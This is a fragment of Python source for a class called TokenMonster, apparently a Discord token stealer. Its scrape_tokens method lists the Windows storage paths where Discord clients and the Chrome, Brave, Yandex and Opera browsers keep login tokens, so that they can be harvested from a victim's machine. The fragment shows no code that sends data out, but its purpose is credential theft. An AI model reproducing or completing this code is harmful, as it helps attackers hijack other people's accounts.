...
class TokenMonster:
    ...
    def scrape_tokens(self):
        ...
        crawl = {
            "Discord Canary": self.pc_roaming + "\\discordcanary",
            "Discord PTB": self.pc_roaming + "\\discordptb",
            'Discord': self.pc_roaming + '\\discord\\Local Storage\\leveldb\\',
            'Chrome': self.pc_local + '\\google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.pc_local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.pc_local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Opera': self.pc_roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\'
        }
